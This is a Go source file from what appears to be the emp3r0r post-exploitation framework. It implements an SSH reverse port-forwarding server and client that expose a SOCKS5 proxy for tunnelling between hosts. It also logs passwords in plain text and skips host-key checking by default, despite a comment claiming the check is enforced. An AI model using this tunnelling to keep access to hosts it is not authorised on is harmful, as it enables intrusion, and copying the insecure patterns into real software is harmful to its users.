package transport

import (
	"context"
	"fmt"
	"io"
	"net"
	"sync"
	"time"

	gliderssh "github.com/gliderlabs/ssh"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/txthinking/socks5"
	"golang.org/x/crypto/ssh"
)

// SSHRemoteFwdServer start a ssh proxy server that forward to client side TCP port
// port: binding port on server side, ssh client will try authentication with this port
// password: ssh client will try authentication with this password.
// We will always use RuntimeConfig.ShadowsocksPassword
func SSHRemoteFwdServer(port, password string, hostkey []byte) (err error) {
	logging.Infof("Starting ssh remote forwarding server on port %s...", port)
	forwardHandler := &gliderssh.ForwardedTCPHandler{}
	server := gliderssh.Server{
		PasswordHandler: func(ctx gliderssh.Context, input_pass string) bool {
			logging.Infof("ssh client try to authenticate with password %s vs %s", input_pass, password)
			success := input_pass == password
			if success {
				logging.Infof("ssh client authenticated")
			}
			return success
		},
		LocalPortForwardingCallback: gliderssh.LocalPortForwardingCallback(func(ctx gliderssh.Context, dhost string, dport uint32) bool {
			logging.Infof("Accepted forward %s %d", dhost, dport)
			return true
		}),
		Addr: ":" + port,
		Handler: gliderssh.Handler(func(s gliderssh.Session) {
			// io.WriteString(s, "Remote forwarding available...\n")
			select {}
		}),
		ReversePortForwardingCallback: gliderssh.ReversePortForwardingCallback(func(ctx gliderssh.Context, host string, port uint32) bool {
			logging.Infof("Attempt to bind %s %d granted", host, port)
			return true
		}),
		RequestHandlers: map[string]gliderssh.RequestHandler{
			"tcpip-forward":        forwardHandler.HandleSSHRequest,
			"cancel-tcpip-forward": forwardHandler.HandleSSHRequest,
		},
	}
	key, err := ssh.ParsePrivateKey(hostkey)
	if err != nil {
		return fmt.Errorf("failed to parse host key: %v", err)
	}
	server.AddHostKey(key)

	return server.ListenAndServe()
}

// SSHReverseProxyClient dial SSHProxyServer, start a reverse proxy
// serverAddr format: 127.0.0.1:22
// FIXME: when using KCP, port number calculation is wrong
func SSHReverseProxyClient(ssh_serverAddr string, // SSH server address:port
	password string, // SSH authentication password
	proxyPort int, // local port to forward to remote, in here it should be Emp3r0rProxyPort
	reverseConns *map[string]context.CancelFunc,
	reverseConnsMutex *sync.Mutex,
	socks5proxy *socks5.Server,
	ctx context.Context, cancel context.CancelFunc,
) (err error) {
	logging.Infof("Starting SSH reverse proxy client on %s, proxy port %d", ssh_serverAddr, proxyPort)

	// start SOCKS5 proxy
	go func() {
		err = StartSocks5Proxy(fmt.Sprintf("0.0.0.0:%d", proxyPort),
			"", socks5proxy, nil)
		if err != nil {
			logging.Warningf("Failed to start SOCKS5 proxy server for SSH reverse proxy: %v", err)
		}
	}()

	return SSHRemoteFwdClient(ssh_serverAddr, password, nil,
		proxyPort, reverseConns, reverseConnsMutex, ctx, cancel)
}

// SSHRemoteFwdClient dial SSHRemoteFwdServer, forward local TCP port to remote server
// serverAddr format: 127.0.0.1:22
// hostkey is the ssh server public key
func SSHRemoteFwdClient(ssh_serverAddr, password string,
	hostkey ssh.PublicKey, // ssh server public key
	local_port int, // local port to forward to remote
	conns *map[string]context.CancelFunc, // record this connection
	connsMutex *sync.Mutex,
	ctx context.Context, cancel context.CancelFunc,
) (err error) {
	hostkey_callback := ssh.InsecureIgnoreHostKey()
	if hostkey != nil {
		hostkey_callback = ssh.FixedHostKey(hostkey)
	}
	config := &ssh.ClientConfig{
		User: "root",
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		// enforce SSH host key verification
		HostKeyCallback: hostkey_callback,
		Timeout:         10 * time.Second,
	}

	// Dial your ssh server.
	conn, err := ssh.Dial("tcp", ssh_serverAddr, config)
	if err != nil {
		return fmt.Errorf("unable to connect: %v", err)
	}
	defer conn.Close()
	logging.Infof("Connected to ssh server on %s", ssh_serverAddr)

	// Request the remote side to open proxy port on all interfaces.
	l, err := conn.Listen("tcp", fmt.Sprintf("0.0.0.0:%d", local_port))
	if err != nil {
		return fmt.Errorf("unable to register tcp forward: %v", err)
	}
	logging.Infof("Forwarding local port %d to remote", local_port)
	defer l.Close()
	defer cancel()

	go func() {
		<-ctx.Done()
		l.Close()
	}()

	connsList := *conns
	if connsMutex != nil {
		connsMutex.Lock()
	}
	connsList[ssh_serverAddr] = cancel // record this connection
	if connsMutex != nil {
		connsMutex.Unlock()
	}
	toAddr := fmt.Sprintf("127.0.0.1:%d", local_port)
	defer func() {
		if connsMutex != nil {
			connsMutex.Lock()
		}
		delete(connsList, ssh_serverAddr)
		if connsMutex != nil {
			connsMutex.Unlock()
		}
	}()

	// forward to target local port
	serveConn := func(conn net.Conn) {
		targetConn, serveConn_error := net.Dial("tcp", toAddr)
		if serveConn_error != nil {
			logging.Warningf("failed to connect to %s: %v", toAddr, serveConn_error)
			err = serveConn_error
			return
		}
		defer targetConn.Close()
		defer conn.Close()
		defer logging.Warningf("%s <-> %s closed", conn.LocalAddr(), toAddr)
		go func() {
			_, serveConn_error = io.Copy(conn, targetConn)
			if serveConn_error != nil {
				logging.Warningf("clientConn <- targetConn: %v", serveConn_error)
				err = serveConn_error
			}
		}()
		_, serveConn_error = io.Copy(targetConn, conn)
		if serveConn_error != nil {
			logging.Warningf("clientConn -> targetConn: %v", serveConn_error)
			err = serveConn_error
		}
	}

	for ctx.Err() == nil {
		inconn, l_err := l.Accept()
		if l_err != nil {
			return fmt.Errorf("SSH RemoteFwd (%s) finished with error: %v", toAddr, l_err)
		}
		go serveConn(inconn)
	}

	return fmt.Errorf("session unexpectedly exited")
}
